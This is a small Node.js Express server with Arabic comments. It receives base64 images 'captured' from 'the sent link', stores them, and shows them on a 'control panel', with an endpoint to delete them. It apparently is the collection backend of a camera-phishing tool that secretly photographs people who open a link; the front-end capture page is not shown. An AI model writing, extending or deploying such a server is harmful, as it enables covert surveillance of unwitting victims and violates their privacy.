const express = require('express');
const app = express();
const path = require('path');

app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

let capturedPhotos = [];

// استقبال الصور من الرابط المرسل
app.post('/upload', (req, res) => {
    const { image } = req.body;
    capturedPhotos.push({ id: Date.now(), data: image });
    res.status(200).send('تم التقاط الصورة');
});

// جلب الصور للوحة التحكم
app.get('/photos', (req, res) => res.json(capturedPhotos));

// حذف الصور
app.delete('/delete/:id', (req, res) => {
    capturedPhotos = capturedPhotos.filter(p => p.id != req.params.id);
    res.status(200).send('تم الحذف');
});

app.listen(3000, () => console.log('السيرفر يعمل على المنفذ 3000'));
